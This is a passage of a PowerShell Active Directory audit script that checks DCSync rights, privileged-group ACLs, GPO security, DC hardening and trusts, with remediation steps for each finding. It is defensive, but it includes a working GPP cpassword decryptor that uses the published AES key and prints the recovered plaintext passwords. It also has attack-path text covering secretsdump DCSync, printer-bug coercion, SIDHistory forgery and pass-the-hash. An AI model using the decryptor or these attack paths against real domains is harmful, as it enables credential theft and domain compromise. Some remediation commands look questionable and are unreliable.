            $sid = $Ace.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value
            $adObj = Get-ADObject -Filter { objectSid -eq $sid } @dcParam `
                         -Properties DisplayName -ErrorAction SilentlyContinue
            if ($adObj) { $principalDisplay = "$($adObj.Name) [$($adObj.objectClass)] (SID: $sid)" }
        } catch {}

        $sidVal = 'unknown'
        try { $sidVal = $Ace.IdentityReference.Translate(
                            [System.Security.Principal.SecurityIdentifier]).Value } catch {}
        $allReplACEs.Add([PSCustomObject]@{
            Principal    = $principalDisplay
            SID          = $sidVal
            Right        = $replGUIDMap[$guid]
            GUID         = $guid
            IsChangesAll = ($guid -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
        })
    }

    if ($allReplACEs.Count -eq 0) {
        Add-Finding "ACLHygiene" "DCSync Rights" "Good" `
            "No unexpected principals hold Replicating Directory Changes rights on domain root" `
            -Pts 7 -Max 7
    }
    else {
        # Separate: holders of "Changes All" are immediately exploitable for DCSync
        $changesAll   =@( @($allReplACEs | Where-Object { $_.IsChangesAll }))
        $changesOnly  =@( @($allReplACEs | Where-Object { -not $_.IsChangesAll }))

        # Build per-principal remediation commands
        $remediationLines = @($allReplACEs | ForEach-Object {
            $p = $_.Principal -replace '\[.*',''.Trim()
            @"
# Remove '$($_.Right)' from $p
`$acl  = Get-Acl 'AD:\$domainDN'
`$sid  = (New-Object System.Security.Principal.NTAccount('$p')).Translate([System.Security.Principal.SecurityIdentifier])
`$guid = [guid]'$($_.GUID)'
`$acl.Access | Where-Object {
    `$_.ObjectType -eq `$guid -and
    `$_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq `$sid.Value
} | ForEach-Object { `$acl.RemoveAccessRule(`$_) }
Set-Acl 'AD:\$domainDN' `$acl
"@
        })

        if ($changesAll.Count -gt 0) {
            Add-Finding "ACLHygiene" "DCSync -- Replicating Directory Changes ALL -- Unexpected Principals" "Critical" `
                "$($changesAll.Count) non-DC principal(s) hold 'Replicating Directory Changes All' -- full DCSync capability. Can dump every credential in the domain remotely with zero disk access on DCs." `
                -Resources ($changesAll.Principal) `
                -AttackPath "$($script:T.IM) secretsdump.py -just-dc DOMAIN/principal:pass@DC.domain -> all NTLM hashes + Kerberos keys + DPAPI masterkeys in seconds. No event 4662 unless SACL is set." `
                -Fix ($remediationLines -join "`n") `
                -MITRE "T1003.006" -CIS "9.1" -Pts 0 -Max 7
            Write-Host "  [!!!] DCSync 'Changes All' principals: $($changesAll.Principal -join ' | ')" -ForegroundColor Red
        }

        if ($changesOnly.Count -gt 0) {
            Add-Finding "ACLHygiene" "DCSync -- Replicating Directory Changes -- Unexpected Principals" "High" `
                "$($changesOnly.Count) non-DC principal(s) hold 'Replicating Directory Changes' only (not Changes All). When combined with a second account holding 'Changes All', full DCSync is achievable." `
                -Resources ($changesOnly.Principal) `
                -Fix ($remediationLines -join "`n") `
                -MITRE "T1003.006" -CIS "9.1" -Pts 0 -Max 7
            Write-Host "  [!] DCSync 'Changes' principals: $($changesOnly.Principal -join ' | ')" -ForegroundColor DarkYellow
        }

        if ($changesAll.Count -eq 0 -and $changesOnly.Count -gt 0) {
            # Partial -- no Changes All, so increment partial score
            $script:Score    += 3
            $script:MaxScore += 7
        }
    }
}
catch [System.UnauthorizedAccessException] {
    Write-AuditWarning "DCSync Rights (9.1)" "Access Denied reading domain root ACL -- re-run as Domain Admin or on a DC. DCSync check is INCOMPLETE." "ACLHygiene"
}
catch {
    Write-AuditWarning "DCSync Rights (9.1)" $_.Exception.Message "ACLHygiene"
}
finally {
    # No resources to release; block kept for structural consistency
    Remove-Variable -Name allReplACEs, changesAll, changesOnly -ErrorAction SilentlyContinue
}

# 9.2 Dangerous ACLs on AdminSDHolder
# False positive controls applied:
#   - Allow ACEs only (Deny = protective, not a threat)
#   - ExtendedRight excluded from dangerous mask (too broad; covers benign password-change rights)
#   - Self excluded (self-write on a template object is meaningless)
#   - Exclusion list includes domain-relative SIDs + Exchange/AADConnect known patterns
try {
    $domSID       = (Get-ADDomain @dcParam -ErrorAction Stop).DomainSID.Value
    $adminSDHolder = "CN=AdminSDHolder,CN=System,$domainDN"
    $ashACL = Get-Acl "AD:\$adminSDHolder" -ErrorAction Stop

    # Rights that are genuinely dangerous on AdminSDHolder
    # Excluded: ExtendedRight (too broad -- covers User-Change-Password etc.)
    # Excluded: Self (self-write on a template object is not exploitable)
    $ashDangerRights = @('GenericAll','GenericWrite','WriteDacl','WriteOwner','WriteProperty')

    # Exclusion pattern covers:
    #   Built-in admin groups (by display name -- Get-Acl returns NTAccount)
    #   CREATOR OWNER, ENTERPRISE DOMAIN CONTROLLERS
    #   Exchange groups that legitimately modify AdminSDHolder
    #   Azure AD Connect MSOL_ sync accounts (legitimate replication)
    $ashLegitPattern = 'Domain Admins|Enterprise Admins|SYSTEM|Administrators|' +
                       'CREATOR OWNER|ENTERPRISE DOMAIN CONTROLLERS|Schema Admins|' +
                       'Exchange Windows Permissions|Exchange Servers|Exchange Trusted Subsystem|' +
                       'Organization Management|Managed Availability Servers|' +
                       'MSOL_|ADSyncAdmins|AAD_'

    $dangerASH = @(@($ashACL.Access) | Where-Object {
        # Only Allow ACEs -- Deny ACEs are protective controls, not threats
        if ($_.AccessControlType -ne 'Allow') { return $false }
        # Skip known-legitimate principals
        if ($_.IdentityReference -match $ashLegitPattern) { return $false }
        # Check if any genuinely dangerous right is granted
        $rights = $_.ActiveDirectoryRights.ToString().Split(',') | ForEach-Object { $_.Trim() }
        ($rights | Where-Object { $_ -in $ashDangerRights }).Count -gt 0
    })

    # Annotate each finding with which specific rights make it dangerous
    $ashDetails = @($dangerASH | ForEach-Object {
        $grantedDanger = $_.ActiveDirectoryRights.ToString().Split(',') |
            ForEach-Object { $_.Trim() } |
            Where-Object { $_ -in $ashDangerRights }
        "$($_.IdentityReference) [$($grantedDanger -join '+')]"
    })

    if ($dangerASH.Count -eq 0) {
        Add-Finding "ACLHygiene" "AdminSDHolder ACLs" "Good" "No dangerous ACLs on AdminSDHolder" -Pts 5 -Max 5
    } else {
        Add-Finding "ACLHygiene" "AdminSDHolder Dangerous ACLs" "Critical" `
            "$($dangerASH.Count) non-admin principal(s) have write-class rights on AdminSDHolder -- SDProp propagates these to ALL protected objects every 60 minutes" `
            -Resources $ashDetails `
            -AttackPath "Write right on AdminSDHolder -> SDProp propagates to all DA/EA accounts every 60min -> permanent control of all privileged accounts" `
            -Fix "Remove dangerous ACE from AdminSDHolder. Use AD ACL Editor (dsacls or ADSI Edit). Verify with: Get-Acl 'AD:\CN=AdminSDHolder,CN=System,$domainDN' | Select -Expand Access" `
            -MITRE "T1222.001" -Pts 0 -Max 5
    }
} catch {
    Add-Finding "ACLHygiene" "AdminSDHolder ACLs" "Info" "Could not read AdminSDHolder ACL: $($_.Exception.Message) -- run on DC or with DA credentials"
}

# 9.3 Dangerous ACLs on Domain Admins group object
# False positive controls:
#   - Allow ACEs only (Deny = protective)
#   - CREATOR OWNER: inherited default on all AD objects, cannot exploit on existing group
#   - ENTERPRISE DOMAIN CONTROLLERS: read-level rights for replication, not write
#   - Exchange groups: Exchange legitimately holds some rights on all group objects
#   - Self: kept -- on a GROUP object Self = validated-write-to-member = add yourself to DA = dangerous
#   - GenericWrite excluded from DA-group check (unlike AdminSDHolder): GenericWrite on a
#     group specifically enables adding members, directly dangerous here
try {
    $daGroupDN = (Get-ADGroup "Domain Admins" @dcParam).DistinguishedName
    $daGroupACL = Get-Acl "AD:\$daGroupDN" -ErrorAction Stop
    $daLegitPattern = 'Domain Admins|Enterprise Admins|SYSTEM|Administrators|' +
                      'CREATOR OWNER|ENTERPRISE DOMAIN CONTROLLERS|Schema Admins|' +
                      'Exchange Windows Permissions|Exchange Servers|Exchange Trusted Subsystem|' +
                      'Organization Management|Managed Availability Servers|' +
                      'MSOL_|ADSyncAdmins|AAD_'
    $daGroupDangerRights = @('GenericAll','GenericWrite','WriteProperty','Self','WriteDacl','WriteOwner')
    $dangerDA = @(@($daGroupACL.Access) | Where-Object {
        if ($_.AccessControlType -ne 'Allow') { return $false }
        if ($_.IdentityReference -match $daLegitPattern) { return $false }
        $rights = $_.ActiveDirectoryRights.ToString().Split(',') | ForEach-Object { $_.Trim() }
        ($rights | Where-Object { $_ -in $daGroupDangerRights }).Count -gt 0
    })
    $daDetails = @($dangerDA | ForEach-Object {
        $grantedDanger = $_.ActiveDirectoryRights.ToString().Split(',') |
            ForEach-Object { $_.Trim() } | Where-Object { $_ -in $daGroupDangerRights }
        "$($_.IdentityReference) [$($grantedDanger -join '+')]"
    })
    if ($dangerDA.Count -gt 0) {
        Add-Finding "ACLHygiene" "Domain Admins Group -- Dangerous ACLs" "Critical" `
            "$($dangerDA.Count) non-admin principal(s) can modify Domain Admins group -- direct path to domain compromise" `
            -Resources $daDetails `
            -AttackPath "Principal with WriteProperty/GenericAll/Self -> Add-ADGroupMember 'Domain Admins' -> instant Domain Admin" `
            -Fix "Remove write rights on Domain Admins group from non-admin principals. Use: (Get-Acl 'AD:\$daGroupDN').Access to enumerate." `
            -MITRE "T1098.002" -Pts 0 -Max 5
    } else {
        Add-Finding "ACLHygiene" "Domain Admins Group ACLs" "Good" "No dangerous ACLs on Domain Admins group" -Pts 5 -Max 5
    }
} catch {
    Write-AuditWarning "ACLHygiene" "Cannot read Domain Admins group ACL: $($_.Exception.Message)" "ACLHygiene"
}

# ===============================================================================
# DOMAIN 10 -- GPO SECURITY
# ===============================================================================
Write-Section "10. GPO SECURITY"

# 10.1 GPP Credential Disclosure -- SYSVOL cpassword audit
# -----------------------------------------------------------------------------
# Group Policy Preferences (GPP) stored credentials in SYSVOL using AES-256,
# but Microsoft published the static encryption key in MS-GPPREF (KB2962486).
# Any domain user with read access to SYSVOL can decrypt these credentials.
#
# Target files:
#   Groups.xml          -- local admin account passwords (most common)
#   Services.xml        -- service account passwords
#   ScheduledTasks.xml  -- task runner account passwords
#   DataSources.xml     -- ODBC / database connection passwords
#   Printers.xml        -- printer connection credentials
#
# MITRE T1552.006 -- Unsecured Credentials: Group Policy Preferences
# CIS Benchmark   -- 18.3.2 (MS15-011/KB3000483 must be applied)
# -----------------------------------------------------------------------------

$sysvolPath = "\\$domFQDN\SYSVOL"

# Published AES-256-CBC key (MS-GPPREF spec, static for all environments)
$GPP_AES_KEY = [byte[]](
    0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
    0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
)

function ConvertFrom-GPPCPassword {
    <#
    .SYNOPSIS Decrypts a GPP cpassword value using the published AES key.
    .OUTPUTS  Plaintext string, or '[decryption failed]' on error.
    #>
    param([string]$CPassword)
    if ([string]::IsNullOrWhiteSpace($CPassword)) { return '' }
    try {
        # Base64 padding normalisation
        $padded = $CPassword.Replace(' ','')
        $mod = $padded.Length % 4
        if ($mod -gt 0) { $padded += '=' * (4 - $mod) }
        $encBytes = [Convert]::FromBase64String($padded)

        $aes           = [System.Security.Cryptography.AesCryptoServiceProvider]::new()
        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
        $aes.KeySize   = 256
        $aes.BlockSize = 128
        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key       = $GPP_AES_KEY
        $aes.IV        = [byte[]](0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)

        $decryptor = $aes.CreateDecryptor()
        $plain     = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
        [System.Text.Encoding]::Unicode.GetString($plain).TrimEnd([char]0)
    }
    catch { '[decryption failed]' }
    finally {
        if ($aes) { $aes.Dispose() }
    }
}

# GPP file types and their XML element / credential context
$GPPTargets = @(
    @{ File = 'Groups.xml';         XPath = '//User/Properties';    UserAttr = 'userName'; PassAttr = 'cpassword'; Context = 'Local account / local admin' }
    @{ File = 'Services.xml';       XPath = '//NTService/Properties'; UserAttr = 'accountName'; PassAttr = 'cpassword'; Context = 'Windows service account' }
    @{ File = 'ScheduledTasks.xml'; XPath = '//*[@cpassword]';       UserAttr = 'runAs';    PassAttr = 'cpassword'; Context = 'Scheduled task run-as account' }
    @{ File = 'DataSources.xml';    XPath = '//DataSource/Properties'; UserAttr = 'username'; PassAttr = 'cpassword'; Context = 'ODBC data source credential' }
    @{ File = 'Printers.xml';       XPath = '//SharedPrinter/Properties'; UserAttr = 'username'; PassAttr = 'cpassword'; Context = 'Printer connection credential' }
)

$GPPFindings     = [System.Collections.Generic.List[PSCustomObject]]::new()
$sysvolAccessible = $false

try {
    if (-not (Test-Path $sysvolPath -ErrorAction Stop)) {
        Write-AuditWarning "GPP cpassword (10.1)" "SYSVOL path '$sysvolPath' unreachable -- check network connectivity and SYSVOL replication health" "GPOSecurity"
    }
    else {
        $sysvolAccessible = $true

        # Single-pass SYSVOL walk -- collect all GPP XML files in one traversal
        # (avoids 5 separate recursive network scans which hang on large environments)
        $gppFileNames  = @($GPPTargets | ForEach-Object { $_.File })
        $gppFileMap    = @{}   # filename -> List[FileInfo]
        foreach ($gt in $GPPTargets) { $gppFileMap[$gt.File] = [System.Collections.Generic.List[object]]::new() }
        $sysvolFileCap = 10000   # safety cap -- prevents indefinite hang on huge SYSVOL shares
        $sysvolScanned = 0
        $sysvolCapped  = $false

        try {
            Get-ChildItem -Path $sysvolPath -Recurse -File -Force -ErrorAction Stop |
                ForEach-Object {
                    $sysvolScanned++
                    if ($sysvolScanned -gt $sysvolFileCap) { $sysvolCapped = $true; return }
                    if ($gppFileNames -contains $_.Name) { $gppFileMap[$_.Name].Add($_) }
                }
        }
        catch [System.UnauthorizedAccessException] {
            Write-AuditWarning "GPP cpassword (10.1)" `
                "Access Denied walking SYSVOL '$sysvolPath'. Results may be incomplete." "GPOSecurity"
        }
        catch {
            Write-Host "  [DBG] SYSVOL walk error: $($_.Exception.Message)" -ForegroundColor DarkGray
        }

        if ($sysvolCapped) {
            Write-AuditWarning "GPP cpassword (10.1)" `
                "SYSVOL scan capped at $sysvolFileCap files to prevent timeout. Results may be incomplete." "GPOSecurity"
        }

        foreach ($Target in $GPPTargets) {
            $xmlFiles = @($gppFileMap[$Target.File])

            foreach ($xmlFile in $xmlFiles) {
                try {
                    [xml]$xmlDoc = Get-Content -Path $xmlFile.FullName -Encoding UTF8 -ErrorAction Stop

                    # Parse all nodes that carry cpassword
                    $nodes = $xmlDoc.SelectNodes($Target.XPath)
                    foreach ($node in $nodes) {
                        $cpass = $node.GetAttribute($Target.PassAttr)
                        if ([string]::IsNullOrWhiteSpace($cpass)) { continue }

                        $username  = $node.GetAttribute($Target.UserAttr)
                        $plaintext = ConvertFrom-GPPCPassword -CPassword $cpass

                        # Extract GPO name from path (...\{GUID}\Machine\Preferences\...)
                        $gpoGuid = if ($xmlFile.FullName -match '\{([0-9A-Fa-f\-]{36})\}') {
                            "{$($Matches[1])}"
                        } else { 'Unknown GPO' }

                        $gpoName = try {
                            $gpoObj = Get-GPO -Guid $gpoGuid.Trim('{}') @dcParam -ErrorAction SilentlyContinue
                            if ($gpoObj) { $gpoObj.DisplayName } else { $gpoGuid }
                        } catch { $gpoGuid }

                        $GPPFindings.Add([PSCustomObject]@{
                            FileType   = $Target.File
                            Context    = $Target.Context
                            GPOName    = $gpoName
                            GPOGuid    = $gpoGuid
                            FilePath   = $xmlFile.FullName
                            Username   = if ($username) { $username } else { '(not specified)' }
                            Cpassword  = $cpass
                            Plaintext  = $plaintext
                            PolicyPath = ($xmlFile.FullName -replace [regex]::Escape($sysvolPath),'\\SYSVOL\...')
                        })
                    }
                }
                catch [System.Xml.XmlException] {
                    Write-Host "  [DBG] XML parse error in '$($xmlFile.FullName)': $($_.Exception.Message)" -ForegroundColor DarkGray
                }
                catch {
                    Write-Host "  [DBG] Could not process '$($xmlFile.FullName)': $($_.Exception.Message)" -ForegroundColor DarkGray
                }
            }
        }  # end foreach Target
    }
}
catch [System.UnauthorizedAccessException] {
    Write-AuditWarning "GPP cpassword (10.1)" "Access Denied accessing SYSVOL '$sysvolPath'" "GPOSecurity"
}
catch {
    Write-AuditWarning "GPP cpassword (10.1)" $_.Exception.Message "GPOSecurity"
}
finally {
    Remove-Variable -Name GPP_AES_KEY -ErrorAction SilentlyContinue    # wipe key from memory
}

if (-not $sysvolAccessible) {
    # Warning already emitted above
}
elseif ($GPPFindings.Count -eq 0) {
    Add-Finding "GPOSecurity" "GPP Passwords (cpassword)" "Good" `
        "No cpassword attributes found in Groups.xml / Services.xml / ScheduledTasks.xml / DataSources.xml / Printers.xml" `
        -Pts 6 -Max 6
}
else {
    # Group by file type for focused findings
    $byType = @($GPPFindings | Group-Object FileType)

    foreach ($typeGroup in $byType) {
        $evidenceLines = @($typeGroup.Group | ForEach-Object {
            "GPO: $($_.GPOName) | User: $($_.Username) | File: $($_.PolicyPath) | Decrypted: $($_.Plaintext)"
        })
        $remediationCmd = @($typeGroup.Group | ForEach-Object {
            "# Remove cpassword from $($_.FilePath)`n" +
            "(Get-Content '$($_.FilePath)') -replace 'cpassword=""[^""]*""','cpassword=""' | Set-Content '$($_.FilePath)'"
        })

        Add-Finding "GPOSecurity" "GPP cpassword -- $($typeGroup.Name)" "High" `
            "$($typeGroup.Count) '$($typeGroup.Name)' file(s) contain cpassword. AES key is publicly documented (MS-GPPREF); any domain user can decrypt these credentials." `
            -Resources ($typeGroup.Group.FilePath) `
            -AttackPath "$($script:T.GP) ($($script:T.PS)) or gpp-decrypt.py -- domain user reads SYSVOL -> decrypts cpassword -> authenticates as service/local admin -> lateral movement to all systems where GPO applied" `
            -Fix ($remediationCmd -join "`n") `
            -MITRE "T1552.006" -CIS "18.3.2" -Pts 0 -Max 6

        Write-Host "  [!] GPP cpassword [$($typeGroup.Name)] -- $($typeGroup.Count) credential(s):" -ForegroundColor Red
        $typeGroup.Group | ForEach-Object {
            Write-Host "      GPO: $($_.GPOName) | User: $($_.Username) | Decrypted: $($_.Plaintext)" -ForegroundColor DarkYellow
        }
    }

    # Master summary finding with all evidence consolidated
    Add-Finding "GPOSecurity" "GPP cpassword -- Full Inventory" "High" `
        "$($GPPFindings.Count) total GPP credential(s) across $($byType.Count) file type(s). Decryption confirmed with published AES key." `
        -Resources ($GPPFindings | ForEach-Object { "[$($_.FileType)] $($_.GPOName) -> user:'$($_.Username)' plaintext:'$($_.Plaintext)'" }) `
        -Fix "1. Delete all GPP password entries via GPMC (Computer/User Config -> Preferences -> right-click entry -> Delete).`n2. Replace with LAPS for local admin: Install-Module LAPS; Update-AdmPwdADSchema; Set-AdmPwdComputerSelfPermission.`n3. Rotate any accounts whose credentials were exposed immediately." `
        -MITRE "T1552.006" -CIS "18.3.2" -Pts 0 -Max 0
}

# 10.2 Scripts in NETLOGON/SYSVOL (check for plaintext credentials)
$scriptFiles = @()
if (Test-Path $sysvolPath) {
    $scriptFiles = @(Get-ChildItem -Path $sysvolPath -Recurse -Include "*.bat","*.cmd","*.ps1","*.vbs" -ErrorAction SilentlyContinue)
    $credScripts = @(@($scriptFiles) | Where-Object {
        try {
            $fc = Get-Content $_.FullName -ErrorAction Stop
            $fc -match 'password|passwd|pwd|credential|secret|net use.*:.*\\' -or
            $fc -match '-Password\s|/password:'
        } catch { $false }
    })
    if ($credScripts.Count -gt 0) {
        Add-Finding "GPOSecurity" "Credentials in SYSVOL Scripts" "Critical" `
            "$($credScripts.Count) script(s) in SYSVOL/NETLOGON contain potential credentials -- readable by all domain users" `
            -Resources ($credScripts.FullName) `
            -Fix "Remove plaintext credentials from all startup/logon scripts. Use managed service accounts or credential vaults." `
            -MITRE "T1552.001" -Pts 0 -Max 5
    }
}

# 10.3 Orphaned/Unlinked GPOs
$allGPOs    = @()
$orphanedGPOs = @()
if (Get-Command Get-GPO -ErrorAction SilentlyContinue) {
    try {
        $allGPOs = @(Get-GPO -All @dcParam -ErrorAction Stop)
        $linkedGPOs = @()
        try {
            $gpoLinks   = [xml](Get-GPOReport -All -ReportType XML @dcParam -ErrorAction Stop)
            $linkedGPOs = @($gpoLinks.GPOS.GPO | Where-Object { $_.LinksTo } |
                            Select-Object -ExpandProperty Identifier |
                            Select-Object -ExpandProperty Identifier)
        } catch {}
        $orphanedGPOs =@( @($allGPOs | Where-Object { $_.Id.ToString() -notin $linkedGPOs }))
    }
    catch { Write-AuditWarning "10.3 Orphaned GPOs" $_.Exception.Message "GPOSecurity" }
} else {
    Write-AuditWarning "10.3 Orphaned GPOs" "GroupPolicy module not available -- install RSAT: Add-WindowsCapability -Online -Name 'Rsat.GroupPolicy.Management.Tools'" "GPOSecurity"
}
if ($orphanedGPOs.Count -gt 0) {
    Add-Finding "GPOSecurity" "Orphaned/Unlinked GPOs" "Low" `
        "$($orphanedGPOs.Count) unlinked GPO(s) -- not applied but may contain sensitive settings or be link-enabled by attacker" `
        -Resources ($orphanedGPOs.DisplayName) `
        -Fix "Review and delete unlinked GPOs. Attacker with CreateLink right can link orphaned GPO with malicious settings." -Pts 0 -Max 1
}

# 10.4 AppLocker / WDAC deployment
$applockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
$wdacPolicy      = Get-CimInstance -Namespace 'root\Microsoft\Windows\CI' -ClassName PS_UpdateAndCompareCIPolicy -ErrorAction SilentlyContinue
if ($applockerPolicy -and $applockerPolicy.RuleCollections.Count -gt 0) {
    $enforced =@( @($applockerPolicy.RuleCollections) | Where-Object { $_.RuleCollectionType -eq 'Exe' -and $_.EnforcementMode -eq 'Enabled' })
    if ($enforced) {
        Add-Finding "GPOSecurity" "AppLocker Enforcement" "Good" "AppLocker EXE rules enforced -- application whitelisting active" -Pts 4 -Max 4
    } else {
        Add-Finding "GPOSecurity" "AppLocker Audit Only" "Medium" "AppLocker deployed in audit mode only -- attacks not blocked, only logged" `
            -Fix "Change AppLocker EXE rules to 'Enforce Rules' after baselining. Test in audit mode first, then enforce." -Pts 1 -Max 4
    }
} elseif ($wdacPolicy) {
    Add-Finding "GPOSecurity" "WDAC Policy" "Good" "Windows Defender Application Control (WDAC) policy active" -Pts 4 -Max 4
} else {
    Add-Finding "GPOSecurity" "No Application Whitelisting" "High" `
        "No AppLocker or WDAC policy deployed -- any executable can run on domain hosts" `
        -Fix "Deploy AppLocker via GPO. Start with EXE + Script + MSI rules in audit mode for 2 weeks, then enforce." `
        -MITRE "T1204.002" -Pts 0 -Max 4
}

# 10.5 ASR Rules
$asrRules = @()
try {
    $mpPref    = Get-MpPreference -ErrorAction SilentlyContinue
    $asrEnabled = if ($mpPref) { $mpPref.AttackSurfaceReductionRules_Ids } else { $null }
    $asrRules = @($asrEnabled)
} catch {}
if ($asrRules.Count -ge 8) {
    Add-Finding "GPOSecurity" "ASR Rules" "Good" "$($asrRules.Count) ASR rules enabled" -Pts 3 -Max 3
} elseif ($asrRules.Count -gt 0) {
    Add-Finding "GPOSecurity" "ASR Rules Partial" "Medium" "Only $($asrRules.Count) ASR rule(s) enabled -- key Office/script rules may be missing" `
        -Fix "Enable all recommended ASR rules via GPO. Minimum: Block Office child processes, Block credential stealing from LSA-SS, Block executable content from email." -Pts 1 -Max 3
} else {
    Add-Finding "GPOSecurity" "ASR Rules Not Deployed" "High" `
        "No Attack Surface Reduction rules deployed -- Office macros, scripts, and credential theft not blocked at the execution layer" `
        -Fix "Deploy ASR rules via Intune or GPO: Computer Config -> Admin Templates -> Windows Defender -> Attack Surface Reduction" `
        -MITRE "T1059.001" -Pts 0 -Max 3
}

# ===============================================================================
# DOMAIN 11 -- DC HARDENING
# ===============================================================================
Write-Section "11. DC HARDENING"

# 11.1 Print Spooler on DCs (PrintNightmare)
$domainControllers = @(Get-ADDomainController -Filter * @dcParam)
$dcWithSpooler = @()
foreach ($dc in $domainControllers) {
    $spooler = Get-Service -Name Spooler -ComputerName $dc.HostName -ErrorAction SilentlyContinue
    if ($spooler -and $spooler.Status -eq 'Running') { $dcWithSpooler += $dc.HostName }
}
if ($dcWithSpooler.Count -eq 0) {
    Add-Finding "DCHardening" "Print Spooler on DCs" "Good" "Print Spooler disabled on all DCs -- PrintNightmare / Printer Bug mitigated" -Pts 5 -Max 5
} else {
    Add-Finding "DCHardening" "Print Spooler Running on DCs" "Critical" `
        "Print Spooler running on $($dcWithSpooler.Count) DC(s): $($dcWithSpooler -join ', ')" `
        -Resources $dcWithSpooler `
        -AttackPath "Printer-Bug: $($script:T.SS).exe DC ATTACKER -> DC authenticates to attacker -> NTLM relay or TGT theft -> DCSync or S4U2Self -> domain compromise" `
        -Fix "Stop-Service Spooler; Set-Service Spooler -StartupType Disabled (on each DC). Deploy via GPO: Computer Config -> System Services -> Print Spooler -> Disabled." `
        -MITRE "T1547.012" -Pts 0 -Max 5
    Write-Host "  [!] Spooler on DCs: $($dcWithSpooler -join ', ')" -ForegroundColor Red
}

# 11.2 Windows Firewall on DCs
$fwEnabled = @((Get-NetFirewallProfile -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $true }).Count)
if ($fwEnabled -ge 3) {
    Add-Finding "DCHardening" "DC Windows Firewall" "Good" "Windows Firewall enabled on all profiles (Domain/Private/Public)" -Pts 3 -Max 3
} elseif ($fwEnabled -gt 0) {
    Add-Finding "DCHardening" "DC Windows Firewall Partial" "Medium" "Firewall enabled on $fwEnabled/3 profiles on this host" `
        -Fix "Enable all profiles: Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True" -Pts 1 -Max 3
} else {
    Add-Finding "DCHardening" "DC Windows Firewall Disabled" "High" `
        "Windows Firewall disabled -- all DC ports exposed to lateral movement from any domain host" `
        -Fix "Enable all firewall profiles. DCs only require: LDAP(389), LDAPS(636), Kerberos(88), DNS(53), RPC(135,49152-65535), SMB(445), NTP(123)." `
        -MITRE "T1562.004" -Pts 0 -Max 3
}

# 11.3 LAPS deployment
$lapsKey = "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd"
$lapsNewKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\LAPS"
$lapsInstalled = (Test-Path $lapsKey) -or (Test-Path $lapsNewKey)
if ($lapsInstalled) {
    try {
        $lapsSchema = Get-ADObject -SearchBase (Get-ADRootDSE @dcParam).schemaNamingContext `
            -Filter { lDAPDisplayName -eq "ms-MCS-AdmPwd" -or lDAPDisplayName -eq "msLAPS-Password" } @dcParam
        if ($lapsSchema) {
            Add-Finding "DCHardening" "LAPS Deployment" "Good" "LAPS schema extended and installed -- unique local admin passwords per computer" -Pts 5 -Max 5
        }
    } catch {
        Add-Finding "DCHardening" "LAPS Schema" "Medium" "LAPS registry present but schema check failed" -Pts 2 -Max 5
    }
} else {
    Add-Finding "DCHardening" "LAPS Not Deployed" "Critical" `
        "LAPS not deployed -- every computer likely shares the same local administrator password. One credential dump = access to all endpoints." `
        -AttackPath "Dump local admin hash from any host -> Pass-Hash to all machines with same password -> lateral movement across entire environment" `
        -Fix "Deploy Windows LAPS (built-in since 2023): Enable-WindowsOptionalFeature -Online -FeatureName RSATClient-Roles-AD-LDS. Enable via GPO." `
        -MITRE "T1550.002" -Pts 0 -Max 5
}

# 11.4 Defender for Identity (MDI) sensor on DCs
$mdiSensor = $false
foreach ($dc in $domainControllers) {
    $sensor = Get-Service -Name AATPSensor,AatpSensorUpdater -ComputerName $dc.HostName -ErrorAction SilentlyContinue
    if (@($sensor) | Where-Object { $_.Status -eq 'Running' }) { $mdiSensor = $true; break }
}
if ($mdiSensor) {
    Add-Finding "DCHardening" "Microsoft Defender for Identity" "Good" "MDI sensor running on DC(s) -- Kerberos anomaly, lateral movement, and LDAP attack detection active" -Pts 4 -Max 4
} else {
    Add-Finding "DCHardening" "MDI Sensor Missing" "High" `
        "Microsoft Defender for Identity sensor NOT on DC(s) -- Kerb-roasting, DC-Sync, Pass-Hash, lateral movement go undetected" `
        -Fix "Install MDI sensor from https://portal.atp.azure.com. Requires Azure MDI license (M365 E5 or MDI standalone)." `
        -MITRE "T1562.001" -Pts 0 -Max 4
}

# ===============================================================================
# DOMAIN 12 -- TRUST RELATIONSHIPS
# ===============================================================================
Write-Section "12. TRUST RELATIONSHIPS"

$trusts = @(Get-ADTrust -Filter * @dcParam -Properties SIDFilteringQuarantined,SelectiveAuthentication,TrustDirection -ErrorAction SilentlyContinue)
if ($trusts.Count -eq 0) {
    Add-Finding "Trusts" "AD Trusts" "Info" "No external/forest trusts found"
} else {
    foreach ($trust in $trusts) {
        $tName = $trust.Name
        $tType = $trust.TrustType

        # External trusts without SID filtering
        if ($tType -eq 'External' -and -not $trust.SIDFilteringQuarantined) {
            Add-Finding "Trusts" "External Trust No SID Filtering" "Critical" `
                "External trust to '$tName' has SID filtering disabled -- attacker in trusted domain can forge SID history to gain DA in this domain" `
                -Resources @($tName) `
                -AttackPath "Compromise any account in trusted domain '$tName' -> add SID of Domain Admins in this domain to SIDHistory -> authenticate -> Domain Admin" `
                -Fix "Enable SID filter quarantine: netdom trust $domFQDN /domain:$tName /quarantine:yes" `
                -MITRE "T1134.005" -Pts 0 -Max 6
        }

        # Forest trusts without selective authentication
        if ($tType -eq 'Forest' -and -not $trust.SelectiveAuthentication) {
            Add-Finding "Trusts" "Forest Trust No Selective Auth" "High" `
                "Forest trust to '$tName' without selective authentication -- any user in trusted forest can authenticate to any resource in this forest" `
                -Resources @($tName) `
                -Fix "Enable selective authentication: Set-ADObject (trust object) -Replace @{msDS-SupportedEncryptionTypes=28}. Or via AD Domains and Trusts." `
                -MITRE "T1199" -Pts 0 -Max 4
        }
    }
    Add-Finding "Trusts" "Trust Inventory" "Info" "$($trusts.Count) trust(s) found: $($trusts.Name -join ', ')"
}

